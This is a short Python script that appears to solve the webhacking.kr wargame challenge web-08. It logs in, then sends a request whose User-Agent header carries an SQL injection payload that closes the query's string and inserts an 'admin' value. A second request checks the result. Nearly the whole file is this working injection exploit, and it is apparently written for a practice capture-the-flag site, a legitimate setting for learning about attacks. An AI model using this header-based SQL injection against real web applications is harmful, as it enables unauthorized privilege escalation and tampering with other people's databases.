from Solution.webhacking.basic import login


user_agent = 'my_agent'
url = 'http://webhacking.kr/challenge/web/web-08/'
s = login()

r = s.get(url, headers={'User-Agent': f"{user_agent}', 1, 'admin')#"})
print(r.text)

r = s.get(url, headers={'User-Agent': user_agent})
print(r.text)
